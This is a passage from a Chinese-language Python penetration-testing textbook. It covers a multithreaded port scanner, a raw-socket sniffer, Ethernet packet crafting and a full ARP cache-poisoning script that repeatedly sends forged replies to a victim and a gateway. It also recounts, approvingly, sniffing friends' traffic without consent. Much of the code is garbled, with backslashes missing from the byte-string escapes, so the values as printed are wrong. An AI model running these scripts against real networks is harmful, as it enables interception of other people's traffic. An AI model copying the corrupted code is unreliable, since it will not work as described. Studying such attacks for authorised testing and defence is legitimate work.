`192.168.0.1`和`10.0.0.16` IP 地址是网关接口。我们在`socket.setdefaulttimeout(1)`中设置了一秒，这意味着扫描机器将在每个端口上最多花费一秒。总共有 4,000 个端口，这意味着如果所有端口都关闭，那么总共花费的时间将是 4000 秒；如果我们将其转换成小时，将变成 1.07 小时，几乎等于我们程序的输出。如果我们设置`socket.setdefaulttimeout(.5)`，所需时间将减少到 30 分钟，这仍然是很长的时间。没有人会使用我们的扫描器。所需时间应该少于 100 秒扫描 4,000 个端口。

# 如何创建一个高效的端口扫描器

我已经提出了一些应该考虑的要点，以便获得一个良好的端口扫描器：

+   应该使用多线程以获得高性能

+   `socket.setdefaulttimeout(1)` 方法应根据情况设置

+   端口扫描器应该能够接受主机名和域名

+   端口应该提供端口号和服务名称

+   应该考虑端口扫描的总时间

+   要扫描端口`0`到`65535`，所需时间大约为 3 分钟

所以现在我已经编写了我的端口扫描器，我通常用于端口扫描：

```py
from threading import Thread
import time
import socket
from datetime import datetime
import cPickle
'''Section1'''
pickle_file = open("port_description.dat",'r') 
data=skill=cPickle.load(pickle_file) 

def scantcp(r1,r2,):
  try:
    for port in range(r1,r2):
      sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      socket.setdefaulttimeout(c)
      result = sock.connect_ex((rmip,port))
      if result==0:
        print "Port Open:-->\t", port,"--", data.get(port, "Not in Database")
      sock.close()

  except Exception as e:
    print e

'''Section 2 '''
print "*"*60
print " \tWelcome, this is the Port scanner \n "
d=raw_input("\tPress D for Domain Name or Press I for IP Address\t") 

if (d=='D' or d=='d'):
    rmserver = raw_input("\t Enter the Domain Name to scan:\t")
    rmip = socket.gethostbyname(rmserver)
elif(d=='I' or d=='i'):
    rmip = raw_input("\t Enter the IP Address to scan: ")

else: 
    print "Wrong input"

port_start1 = int(raw_input("\t Enter the start port number\t"))
port_last1 = int(raw_input("\t Enter the last port number\t"))
if port_last1>65535:
  print "Range not Ok"
  port_last1 = 65535
  print "Setting last port 65535"
conect=raw_input("For low connectivity press L and High connectivity Press H\t")

if (conect=='L' or conect=='l'):
    c =1.5

elif(conect =='H' or conect=='h'):
    c=0.5

else:
    print "\twrong Input"

'''Section 3'''
print "\n Mohit's port Scanner is working on ",rmip
print "*"*60
t1= datetime.now()
total_ports=port_last1-port_start1

ports_by_one_thread =30
                   # tn number of port handled by one thread
total_threads=total_ports/ports_by_one_thread # tnum number of threads
if (total_ports%ports_by_one_thread!= 0):
    total_threads= total_threads+1

if (total_threads > 300):
  ports_by_one_thread= total_ports/300
  if (total_ports%300 !=0):
    ports_by_one_thread= ports_by_one_thread+1

  total_threads = total_ports/ports_by_one_thread 
  if (total_ports%total_threads != 0):
    total_threads= total_threads+1

threads= []
start1 = port_start1
try:
  for i in range(total_threads):

    last1=start1+ports_by_one_thread
    # thread=str(i)
    if last1>=port_last1:
      last1 = port_last1
    port_thread = Thread(target=scantcp,args=(start1,last1,) )
    port_thread.start()
    threads.append(port_thread)
    start1=last1

except Exception as e :
     print e
'''Section 4'''
for t in threads:
    t.join()
print "Exiting Main Thread"
t2= datetime.now()
total =t2-t1
print "scanning complete in " , total

```

不要害怕看到完整的代码；我花了 2 周的时间。我将逐节向你解释完整的代码。在`section1`中，前两行与存储端口信息的数据库文件有关，这将在创建数据库文件时进行解释。`scantcp()`函数由线程执行。在`section 2`中，这是用于用户输入的。如果用户提供的端口范围超过`65535`，那么代码会自动处理错误。低连通性和高连通性意味着如果你在使用互联网，使用低连通性。如果你在自己的网络上使用代码，你可以使用高连通性。在`section 3`中，写入了线程创建逻辑。`30`个端口将由一个线程处理，但如果线程数超过`300`，则端口每个线程的方程将被重新计算。在`for`循环中，线程被创建，每个线程携带自己的端口范围。在`section 4`中，线程被终止。

我在进行了大量实验后编写了上述代码。

现在，是时候看`portsc15.py`程序的输出了：

```py
 K:\Book_projects\Project Snake 2nd\Chapter2_scanning>python port_scanner15.py
************************************************************
 Welcome, this is the Port scanner

 Press D for Domain Name or Press I for IP Address i
 Enter the IP Address to scan: 10.0.0.1
 Enter the start port number 1
 Enter the last port number 4000
For low connectivity press L and High connectivity Press H l

 Mohit's port Scanner is working on 10.0.0.1
************************************************************
Port Open:--> 875 -- Not in Database
Port Open:--> 3306 -- MySQL database system Official
Port Open:--> 80 -- QUIC (from Chromium) for HTTP Unofficial
Port Open:--> 111 -- ONC RPC (Sun RPC) Official
Port Open:--> 443 -- QUIC (from Chromium) for HTTPS Unofficial
Port Open:--> 22 -- , SCTP : Secure Shell (SSH)ΓÇöused for secure logins, file transfers (scp, sftp) and port forwarding Official
Port Open:--> 53 -- Domain Name System (DNS) Official
Exiting Main Thread
scanning complete in 0:00:31.778000

K:\Book_projects\Project Snake 2nd\Chapter2_scanning>
```

我们高效的端口扫描器给出了与之前简单扫描器相同的输出，但从性能的角度来看，有很大的差异。简单扫描器所花费的时间是`1:06:43.272751`，但新的多线程扫描器只花了 32 秒。它还显示了服务名称。让我们检查一下端口`1`到`50000`的更多输出：

```py
 K:\Book_projects\Project Snake 2nd\Chapter2_scanning>python port_scanner15.py
************************************************************
 Welcome, this is the Port scanner

 Press D for Domain Name or Press I for IP Address i
 Enter the IP Address to scan: 192.168.0.3
 Enter the start port number 1
 Enter the last port number 50000
For low connectivity press L and High connectivity Press H l

 Mohit's port Scanner is working on 192.168.0.3
************************************************************
Port Open:--> 22 -- , SCTP : Secure Shell (SSH)ΓÇöused for secure logins, file transfers (scp, sftp) and port forwarding Official
Port Open:--> 875 -- Not in Database
Port Open:--> 53 -- Domain Name System (DNS) Official
Port Open:--> 80 -- QUIC (from Chromium) for HTTP Unofficial
Port Open:--> 8443 -- SW Soft Plesk Control Panel, Apache Tomcat SSL, Promise WebPAM SSL, McAfee ePolicy Orchestrator (ePO) Unofficial
Port Open:--> 111 -- ONC RPC (Sun RPC) Official
Port Open:--> 443 -- QUIC (from Chromium) for HTTPS Unofficial
Port Open:--> 3306 -- MySQL database system Official
Exiting Main Thread
scanning complete in 0:02:48.718000
```

所花费的时间是 2 分钟 48 秒；我在高连通性下做了相同的实验，所花费的时间是`0:01:23.819774`，几乎是前一个的一半。

现在，我将教你如何创建一个包含所有端口号描述的数据库文件；让我们了解如何创建一个包含所有端口描述的 pickle 数据库文件。打开以下链接：[`en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers`](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)。

复制端口描述部分并将其保存在一个文本文件中。请参阅以下截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/5d3a2287-362e-41db-b1c5-954311e314f1.png)

让我们看一下`creatdicnew.py`的代码，将前面的文件转换成一个`pickle`文件：

```py
import cPickle 
pickle_file = open("port_description.dat","w") 
file_name = raw_input("Enter the file name ")
f = open(file_name,"r")
dict1 = {}
for line in f:
  key, value = line.split(':', 1)

  dict1[int(key.strip())] = value.strip()

print "Dictionary is created"
cPickle.dump(dict1,pickle_file) 
pickle_file.close()
print "port_description.dat is created"
```

当你运行上述代码时，代码会要求你输入文本文件名。在给出文件名后，代码将把文本文件转换成一个名为`port_description.dat`的 pickle 文件。

# 总结

网络扫描是为了收集关于网络、主机和正在运行的服务的信息。网络扫描是通过使用操作系统的`ping`命令来完成的；ping 扫描利用了 ping 功能并扫描 IP 地址列表。有时，ping 扫描不起作用，因为用户可能关闭了他们的 ICMP ECHO 回复功能或使用防火墙来阻止 ICMP 数据包。在这种情况下，你的 ping 扫描器可能无法工作。在这种情况下，我们必须利用 TCP 三次握手；TCP 工作在传输层，所以我们必须选择我们想要进行 TCP 连接扫描的端口号。Windows 操作系统的一些端口是始终开放的，所以你可以利用这些开放的端口。第一个主要部分是专门用于网络扫描；当你进行网络扫描时，你的程序应该具有最大的性能并且需要最少的时间。为了显著提高性能，应该使用多线程。

在扫描活动主机之后，端口扫描用于检查特定主机上运行的服务；有时，一些程序使用允许特洛伊木马和端口扫描可以检测这些类型威胁的互联网连接。为了进行高效的端口扫描，多线程起着至关重要的作用，因为端口号范围从`0`到`65536`。要扫描一个庞大的列表，必须使用多线程。

在下一章中，您将看到嗅探及其两种类型：被动嗅探和主动嗅探。您还将学习如何捕获数据，数据包构建的概念，以及使用 Scapy 库制作自定义数据包。


# 第三章：嗅探和渗透测试

当我攻读工程硕士（M.E）学位时，我经常使用我的最爱工具*Cain and Abel*在朋友的宿舍中嗅探网络。我的朋友们通常会上电子商务网站。第二天，当我告诉他们他们购物的鞋子很好时，他们会感到惊讶。他们总是想知道我是如何得到这些信息的。嗯，这都是因为嗅探网络。

在本章中，我们将学习嗅探网络，并涵盖以下主题：

+   嗅探的概念

+   网络嗅探的类型

+   使用 Python 进行网络嗅探

+   使用 Python 进行数据包制作

+   ARP 欺骗的概念和 Python 实现

+   通过自定义数据包制作来测试安全性

# 引入网络嗅探

嗅探是通过软件（应用程序）或硬件设备监视和捕获通过给定网络的所有数据包的过程。嗅探通常由网络管理员执行。但是，攻击者可能使用嗅探器来捕获数据，而这些数据有时可能包含敏感信息，例如用户名和密码。网络管理员使用交换机`SPAN`端口。交换机将流量的一个副本发送到`SPAN`端口。管理员使用此`SPAN`端口来分析流量。如果您是黑客，您一定使用过*Wireshark*工具。嗅探只能在子网内进行。在本章中，我们将学习使用 Python 进行嗅探。但是，在此之前，我们需要知道有两种嗅探方法。它们如下：

+   被动嗅探

+   主动嗅探

# 被动嗅探

被动嗅探是指从基于集线器的网络中嗅探。通过将数据包嗅探器放置在混杂模式下的网络中，黑客可以捕获子网内的数据包。

# 主动嗅探

这种类型的嗅探是在基于交换机的网络上进行的。交换机比集线器更智能。它在 MAC 表中检查后将数据包发送到计算机。主动嗅探是通过使用 ARP 欺骗来实现的，这将在本章中进一步解释。

# 使用 Python 实现网络嗅探

在学习网络嗅探的实现之前，让我们了解一个特定的`struct`方法：

+   `struct.pack(fmt, v1, v2, ...)`: 此方法返回一个包含根据给定格式打包的值`v1`、`v2`等的字符串

+   `struct.unpack(fmt, string)`: 此方法根据给定的格式解包字符串

让我们讨论以下代码片段中的代码：

```py
import struct
ms=  struct.pack('hhl', 1, 2, 3)
print (ms)
k= struct.unpack('hhl',ms)
print k
```

前述代码的输出如下：

```py
G:PythonNetworkingnetwork>python str1.py
 ☻ ♥
(1, 2, 3)
```

首先，导入`struct`模块，然后以`hhl`格式打包`1`、`2`和`3`整数。打包的值就像机器码一样。使用相同的`hhl`格式解包值；这里，`h`表示短整数，`l`表示长整数。更多细节将在后续章节中提供。

考虑客户端-服务器模型的情况；让我们通过一个例子来说明。

运行`struct1.py`文件。服务器端代码如下：

```py
import socket
import struct
host = "192.168.0.1"
port = 12347
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print "connected by", addr
msz= struct.pack('hhl', 1, 2, 3) 
conn.send(msz)
conn.close()
```

整个代码与我们之前看到的一样，使用`msz= struct.pack('hhl', 1, 2, 3)`打包消息和`conn.send(msz)`发送消息。

运行`unstruc.py`文件。客户端代码如下：

```py
import socket
import struct 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.0.1"
port =12347
s.connect((host,port))
msg= s.recv(1024)
print msg
print struct.unpack('hhl',msg)
s.close()
```

客户端代码接受消息并按给定格式解包。

客户端代码的输出如下：

```py
C:network>python unstruc.py
 ☻ ♥
(1, 2, 3)
```

服务器端代码的输出如下：

```py
G:PythonNetworkingprogram>python struct1.py
connected by ('192.168.0.11', 1417)
```

现在，您应该对如何打包和解包数据有一个相当好的理解。

# 格式字符

我们已经在打包和解包方法中看到了格式。在下表中，我们有**C 类型**和**Python 类型**列。它表示 C 和 Python 类型之间的转换。**标准大小**列指的是以字节为单位的打包值的大小：

| **格式** | **C 类型** | **Python 类型** | **标准大小** |
| --- | --- | --- | --- |
| x | 填充字节 | 无值 |  |
| c | 字符 | 长度为 1 的字符串 | 1 |
| b | 有符号字符 | 整数 | 1 |
| B | 无符号字符 | 整数 | 1 |
| ? | _Bool | bool | 1 |
| h | short | integer | 2 |
| H | unsigned short | integer | 2 |
| i | int | integer | 4 |
| I | unsigned int | integer | 4 |
| l | long | integer | 4 |
| L | unsigned long | integer | 4 |
| q | long long | integer | 8 |
| Q | unsigned long long | integer | 8 |
| f | float | float | 4 |
| d | double | float | 8 |
| s | char[] | string |  |
| p | char[] | string |  |
| P | void * | integer |  |

让我们来看看当一个值以不同格式打包时会发生什么：

```py
 >>> import struct
 >>> struct.pack('b',2)
  'x02'
  >>> struct.pack('B',2)
  'x02'
  >>> struct.pack('h',2)
  'x02x00'
```

我们用三种不同的格式打包了数字`2`。从前表中我们知道，*b*和*B*各自占用一个字节，这意味着它们的大小相同。然而，`*h*`占用两个字节。

现在，让我们使用长整型，即八个字节：

```py
  >>> struct.pack('q',2)
  'x02x00x00x00x00x00x00x00'
```

如果我们在网络上工作，应该在以下格式中使用`!`。`!`用于避免网络字节是小端还是大端的混淆。有关大端和小端的更多信息，您可以参考维基百科关于字节顺序的页面。

```py
  >>> struct.pack('!q',2)
  'x00x00x00x00x00x00x00x02'
  >>>
```

在格式中使用`!`时，您可以看到差异。

在进行嗅探之前，您应该了解以下定义：

+   **PF_PACKET**：它在设备驱动程序层运行。Linux 的`pcap`库使用`PF_PACKET`套接字。要运行此程序，您必须以 root 用户身份登录。如果您想在互联网协议层以下的最基本级别上发送和接收消息，那么您需要使用`PF_PACKET`。

+   **原始套接字**：它不关心网络层堆栈，并提供了一种快捷方式，可以直接与应用程序发送和接收数据包。

以下套接字方法用于字节顺序转换：

+   `socket.ntohl(x)`: 这是网络到主机的长整型。它将网络中的 32 位正整数转换为主机的字节顺序。

+   `socket.ntohs(x)`: 这是网络到主机的短整型。它将网络中的 16 位正整数转换为主机的字节顺序。

+   `socket.htonl(x)`: 这是主机到网络的长整型。它将主机中的 32 位正整数转换为网络的字节顺序。

+   `socket.htons(x)`: 这是主机到网络的短整型。它将主机中的 16 位正整数转换为网络的字节顺序。

那么，前面四种方法的意义是什么？

考虑一个 16 位数字，0000000000000011。当您将这个数字从一台计算机发送到另一台计算机时，它的顺序可能会改变。接收计算机可能会以另一种形式接收它，比如 1100000000000000。这些方法将从您的本机字节顺序转换为网络字节顺序，然后再转换回来。现在，让我们看一下实现网络嗅探器的代码，它将在 TCP/IP 的三层上工作，即物理层（以太网）、网络层（IP）和 TCP 层（端口）。

在查看代码之前，您应该了解所有三层的头部：

+   **物理层**：该层处理以太网帧，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/8b41b288-afb2-42e6-9ee1-66278654c99c.png)

以太网帧 IEEE 802.3 的结构

上图的解释如下：

+   **前导码**由七个字节组成，全部为 10101010 的形式，接收器用它来建立位同步

+   **起始帧定界符**由一个字节组成，10101011，它是一个帧标志，表示帧的开始

+   目的地和源地址通常被引用为六个字节的以太网地址序列

我们只对源地址和目的地址感兴趣。数据部分包含 IP 和 TCP 头部。

您应该永远记住的一件事是，当帧到达我们的程序缓冲区时，它不包含**前导码**和**起始帧定界符**字段。

MAC 地址，如`AA:BB:CC:56:78:45`，包含 12 个十六进制字符，每个字节包含两个十六进制值。为了存储 MAC 地址，我们将使用六个字节的内存。

+   **网络或 IP 层**：在这一层，我们对源和目的地的 IP 地址感兴趣。

现在，让我们继续看下面的 IPv4 头部图表：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/f167844a-aed1-4d01-836c-ed9d0f5f9fa5.png)

IPv4 头部

IPv4 数据包头由 14 个字段组成，其中只有 13 个是必需的。第 14 个字段是可选的。该头部长度为 20 字节。最后 8 个字节包含我们的源 IP 地址和目标 IP 地址。从第 12 到 16 个字节包含源 IP 地址，从第 17 到 20 个字节包含目标 IP 地址：

+   **TCP 头部**：在这个头部中，我们对源端口和目的端口地址感兴趣。如果注意 TCP 头部，您会意识到它也是 20 字节长，头部的起始两个字节提供了源端口，接下来的两个字节提供了目的端口地址。您可以在下图中看到 TCP 头部：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/48d8e2b8-f201-4128-84c9-bb60fa6f0a6e.png)

TCP 头部

现在，启动接口卡的混杂模式，并以超级用户的身份给出命令。那么，什么是混杂模式？在计算机网络中，混杂模式允许网络接口卡读取到达其子网的数据包。例如，在集线器环境中，当数据包到达一个端口时，它会被复制到其他端口，只有预期的用户才能读取该数据包。但是，如果其他网络设备也在混杂模式下工作，那么该设备也可以读取该数据包：

```py
  ifconfig eth0 promisc
```

检查前面的命令的效果，如下截图所示，通过输入`ifconfig`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/80d8f576-8d9b-4761-8c40-cb4d6486e756.png)

显示混杂模式

前面的截图显示了`eth0`网络卡，并且它正在混杂模式下工作。

由于其驱动程序、内核支持等原因，有些网卡无法设置为混杂模式。

现在，是时候编码了。首先，让我们完整地看一下以下代码片段，然后逐行理解它：

```py
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
while True:
  try:
    pkt = s.recvfrom(2048)
    ethhead = pkt[0][0:14]
    eth = struct.unpack("!6s6s2s",ethhead)
    print "*"*50
    print "--------Ethernet Frame--------"
    print "Source MAC --> Destination MAC"
    print binascii.hexlify(eth[1]),"-->",binascii.hexlify(eth[0])
    print "-----------IP------------------"
    num=pkt[0][14].encode('hex')
    ip_length = (int(num)%10)*4
    ip_last_range = 14+ip_length
    ipheader = pkt[0][14:ip_last_range]
    ip_hdr = struct.unpack("!12s4s4s",ipheader)
    print "Source IP--> Destination IP"
    print socket.inet_ntoa(ip_hdr[1]),"-->", socket.inet_ntoa(ip_hdr[2])
    print "---------TCP----------"
    tcpheader = pkt[0][ip_last_range:ip_last_range+20]

    tcp_hdr = struct.unpack("!HH9sB6s",tcpheader)
    print "Source Port--> Destination Port"
    print tcp_hdr[0],"-->", tcp_hdr[1]
    flag1 =tcp_hdr[3]
    str1 = bin(flag1)[2:].zfill(8) 
    flag1 = ''
    if str1[0]== '1':
      flag1 = flag1+"CWR "
    if str1[1] == '1':
      flag1 = flag1+ "ECN Echo "
    if str1[2] == '1':
      flag1 = flag1 + "Urgent "
    if str1[3]== '1':
      flag1 = flag1+ "Ack "

    if str1[4]== '1':
      flag1 = flag1+"Push "
    if str1[5] == '1':
      flag1 = flag1+ "Reset "
    if str1[6] == '1':
      flag1 = flag1 + "Sync "
    if str1[7]== '1':
      flag1 = flag1+ "Fin "

    print "Flag", flag1
  except Exception as e :
    print e

```

我们已经定义了`socket.PF_PACKET, socket.SOCK_RAW`行。`socket.htons(0x0800)`语法显示了感兴趣的协议。`0x0800`代码定义了`ETH_P_IP`协议。您可以在`/usr/include/linux`中的`if_ether.h`文件中找到所有代码。`pkt = s.recvfrom(2048)`语句创建了一个 2048 的缓冲区。传入的帧存储在`pkt`变量中。如果打印这个`pkt`，它会显示元组，但我们宝贵的信息位于第一个元组中。`ethhead = pkt[0][0:14]`语句从`pkt`中取出前 14 个字节。以太网帧长度为 14 字节，它首先出现在下图中，这就是为什么我们使用前 14 个字节：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/d6a4895e-4ca3-4853-80b2-058b75a93041.png)

头部的配置

在`eth = struct.unpack("!6s6s2s",ethhead)`语句中，`!`表示网络字节，`6s`表示六个字节，正如我们之前讨论的那样。`binascii.hexlify(eth[0])`语句返回了二进制数据的十六进制表示。`ip_length = (int(num)%10)*4`语法告诉我们 IPv4 头部的大小。`ipheader = pkt[0][14:ip_last_range]`语句提取了范围内的数据。接下来是 IP 头部和`ip_hdr =struct.unpack("!12s4s4s",ipheader)`语句，它将数据解包成三部分，其中我们的目标和源 IP 地址分别位于第二部分和第三部分。`socket.inet_ntoa(ip_hdr[3])`语句将 32 位打包的 IPv4 地址（一个长度为四个字符的字符串）转换为其标准的点分十进制字符串表示形式。

`tcpheader **=** pkt[0][ip_last_range:ip_last_range+20]`语句提取了接下来的 20 个字节数据。`tcp_hdr = struct.unpack("!HH9sB6s",tcpheader)`语句分为五部分，即`HH9sB6s`首先，然后是源端口和目的端口号。第四部分 B 表示标志值。使用`str1 = bin(flags)[2:].zfill(8)`语法将标志 int 值转换为八位二进制值。

`sniffer_new.py`的输出如下：

```py
 --------Ethernet Frame--------
Source MAC --> Destination MAC
005056e2859d --> 000c29436fc7
-----------IP------------------
Source IP--> Destination IP
91.198.174.192 --> 192.168.0.24
---------TCP----------
Source Port--> Destination Port
443 --> 43885
Flag Ack Push Fin 

**************************************************
--------Ethernet Frame--------
Source MAC --> Destination MAC
005056e2859d --> 000c29436fc7
-----------IP------------------
Source IP--> Destination IP
91.198.174.192 --> 192.168.0.24
---------TCP----------
Source Port--> Destination Port
443 --> 43851
Flag Ack 
```

我们的 sniffer 现在运行正常。让我们讨论输出的结果。以太网帧显示了目的 MAC 和源 MAC。IP 头告诉源 IP 数据包来自何处，目的 IP 是运行在我们子网上的另一个操作系统。TCP 头显示了`源端口`，`目的端口`和`标志`。源端口是`443`，这表明有人正在浏览网站。既然我们有了 IP 地址，让我们看看`91.198.174.192`上运行着哪个网站：

```py
 >>> import socket
 >>> socket.gethostbyaddr('91.198.174.192')
('text-lb.esams.wikimedia.org', [], ['91.198.174.192'])
>>>
```

前面的结果显示了`text-lb.esams.wikimedia.org`[ ](http://text-lb.esams.wikimedia.org)网站。

在输出中，显示了两个数据包。如果打印`tcp_hdr[3]`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/b42e4674-f2e5-425f-99d0-5dc9d080f4cf.png)

标志值

如果出现`16`，那么`bin(flag1)[2:].zfill(8)`语法将返回`00010000`，这意味着 ACK 位已打开。整数 25 表示 00011001，这表示**Ack**，**Push**和**Fin**位已打开。

现在，让我们对代码进行一些修改。在代码的末尾添加一行：

```py
print pkt[0][ip_last_range+20:]
```

让我们看看输出如何改变：

```py
  HTTP/1.1 304 Not Modified
  Server: Apache
  X-Content-Type-Options: nosniff
  Cache-control: public, max-age=300, s-maxage=300
  Last-Modified: Thu, 25 Sep 2014 18:08:15 GMT
  Expires: Sat, 27 Sep 2014 06:41:45 GMT
  Content-Encoding: gzip
  Content-Type: text/javascript; charset=utf-8
  Vary: Accept-Encoding,X-Use-HHVM
  Accept-Ranges: bytes
  Date: Sat, 27 Sep 2014 06:37:02 GMT
  X-Varnish: 3552654421 3552629562
  Age: 17
  Via: 1.1 varnish
  Connection: keep-alive
  X-Cache: cp1057 hit (138)
  X-Analytics: php=zend
```

有时，我们对 TTL 感兴趣，这是 IP 头的一部分。这意味着我们将不得不更改解包函数：

```py
    ipheader = pkt[0][14:ip_last_range]
    ip_hdr = struct.unpack("!8sB3s4s4s",ipheader)
    print "Source IP--> Destination IP, "
    print socket.inet_ntoa(ip_hdr[3]),"-->", socket.inet_ntoa(ip_hdr[4])
    print "TTL: ",ip_hdr[1]
```

现在，让我们检查`sniffer_ttl.py`的输出：

```py
 --------Ethernet Frame--------
Source MAC --> Destination MAC
005056e2859d --> 000c29436fc7
-----------IP------------------
Source IP--> Destination IP
74.125.24.157 --> 192.168.0.24
TTL: 128
---------TCP----------
Source Port--> Destination Port
443 --> 48513
16
Flag Ack 
```

`TTL`值为`128`。那它是如何工作的呢？非常简单；我们以 8sB3s4s4s 的格式解包了值，我们的 TTL 字段出现在第九个字节。8s 之后意味着在第八个字节之后，我们以 B 的形式得到 TTL 字段。

# 了解数据包构造

这是黑客或渗透测试人员可以创建定制数据包的技术。通过使用定制数据包，黑客可以执行许多任务，如探测防火墙规则集、端口扫描和操作系统的行为。有许多工具可用于数据包构造，如 Hping 和 Colasoft 数据包生成器。数据包构造是一种技能。您可以在没有工具的情况下执行它，因为您有 Python。

首先，我们创建以太网数据包，然后将它们发送给受害者。让我们看看`eth.py`的整个代码，然后逐行理解它：

```py
import socket
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))
sor = 'x00x0cx29x4fx8ex35'
des ='x00x0Cx29x2Ex84x7A'
code ='x08x00'
eth = des+sor+code
s.send(eth)
```

您已经在数据包嗅探器中看到了`s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))`。现在，决定网络接口。我们选择 eth0 接口发送数据包。`s.bind(("eth0",socket.htons(0x0800)))`语句将 eth0 接口与协议值绑定。接下来的两行定义了源 MAC 地址和目的 MAC 地址。`code ='x08x00'`语句显示了感兴趣的协议。这是 IP 协议的代码。`eth = des+sor+code`语句用于组装数据包。下一行`s.send(eth)`发送数据包。

# 介绍 ARP 欺骗并使用 Python 实现

**ARP**（**地址解析协议**）用于将 IP 地址转换为其对应的以太网（MAC）地址。当数据包到达网络层（OSI）时，它具有目的设备的 IP 地址和数据链路层数据包，需要目的设备的 MAC 地址。在这种情况下，发送方使用 ARP。

术语**地址解析**指的是在网络中查找计算机的 MAC 地址的过程。以下是 ARP 可能发送的两种类型的 ARP 消息：

+   ARP 请求

+   ARP 回复

# ARP 请求

主机可能想要向同一子网中的另一台机器发送消息。主机只知道 IP 地址，而在数据链路层发送消息需要 MAC 地址。在这种情况下，主机广播 ARP 请求。子网中的所有机器都会收到消息。值的以太网协议类型是`0x806`。

# ARP 回复

预期的用户将以他们的 MAC 地址做出回应。这个回复是单播的，称为 ARP 回复。

# ARP 缓存

为了减少地址解析请求的数量，客户端通常会缓存解析的地址一段时间。ARP 缓存是有限大小的。当任何设备想要向子网中的另一个目标设备发送数据时，它必须首先确定该目标的 MAC 地址，即使发送方知道接收方的 IP 地址。这些 IP 到 MAC 地址映射来自每个设备上维护的 ARP 缓存。未使用的条目将被删除，这样可以释放缓存中的一些空间。使用`arp -a`命令查看 ARP 缓存，如下屏幕截图所示：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/79a028ae-7eff-40e2-a4e1-9323e982c44b.png)

ARP 缓存

ARP 欺骗，也称为 ARP 缓存中毒，是一种攻击类型，攻击者通过改变受害者机器的 MAC 地址，在网关的 ARP 缓存中，以及改变网关的 MAC 地址，在受害者机器的 ARP 缓存中。这种技术用于攻击局域网。攻击者可以在局域网上嗅探数据帧。在 ARP 欺骗中，攻击者向网关和受害者发送虚假回复。目的是将攻击者的 MAC 地址与另一个主机的 IP 地址（如默认网关）关联起来。ARP 欺骗用于主动嗅探。

现在，我们将使用一个示例来演示 ARP 欺骗。

网络中所有机器的 IP 地址和 MAC 地址如下：

| **机器名称** | **IP 地址** | **MAC 地址** |
| --- | --- | --- |
| Windows XP（受害者） | `192.168.0.11` | `00:0C:29:2E:84:7A` |
| Linux（攻击者） | `192.168.0.10` | `00:0C:29:4F:8E:35` |
| Windows 7（网关） | `192.168.0.1` | `00:50:56:C0:00:08` |

让我们来看一下下面的图中显示的 ARP 协议头部：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/3021d565-f923-4660-880d-3016357b854d.png)

ARP 头部

让我们逐行查看代码来实现 ARP 欺骗并讨论它：

```py
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

sor = 'x00x0cx29x4fx8ex35'
victmac ='x00x0Cx29x2Ex84x7A'

gatemac = 'x00x50x56xC0x00x08'
code ='x08x06'
eth1 = victmac+sor+code #for victim
eth2 = gatemac+sor+code # for gateway

htype = 'x00x01'
protype = 'x08x00'
hsize = 'x06'
psize = 'x04'
opcode = 'x00x02'

gate_ip = '192.168.0.1'
victim_ip = '192.168.0.11' 
gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

while 1:
  s.send(arp_victim)
  s.send(arp_gateway)
```

在之前的数据包制作部分，您创建了以太网帧。在这段代码中，我们使用了三个 MAC 地址，这些地址也显示在前面的表中。在这里，我们使用了`code ='x08x06'`，这是 ARP 协议的代码。制作的两个以太网数据包是`eth1`和`eth2`。下一行，`htype ='x00x01'`，表示以太网。一切都按照 ARP 头部中显示的顺序进行，`protype ='x08x00'`表示协议类型；`hsize ='x06'`显示硬件地址大小；`psize ='x04'`给出 IP 地址长度；`opcode ='x00x02'`显示这是一个回复数据包。`gate_ip ='192.168.0.1'`和`victim_ip ='192.168.0.11'`语句分别是网关和受害者的 IP 地址。`socket.inet_aton（gate_ip）`方法将 IP 地址转换为十六进制格式。最后，我们根据 ARP 头部组装整个代码。`s.send()`方法也将数据包放在了电缆上。

现在，是时候看输出了。运行`arpsp.py`文件。

让我们检查一下受害者的 ARP 缓存：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/c97cc4e2-236b-4234-8e37-6c55fef80370.png)

受害者的 ARP 缓存

前面的屏幕截图显示了 ARP 欺骗攻击之前和之后的 ARP 缓存。从屏幕截图中可以清楚地看出网关 IP 的 MAC 地址已经改变。我们的代码运行正常。

让我们检查一下网关的 ARP 缓存：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/a3f826fc-2fee-43ee-8667-548dd7de270e.png)

网关的 ARP 缓存

前面的屏幕截图显示我们的代码已经成功运行。受害者和攻击者的 IP 具有相同的 MAC 地址。现在，所有发送到网关的数据包都将通过攻击者的系统，并且攻击者可以有效地读取网关和受害者计算机之间来回传输的数据包。

在渗透测试中，你必须攻击（ARP 欺骗）网关，以调查它是否容易受到 ARP 欺骗的影响。

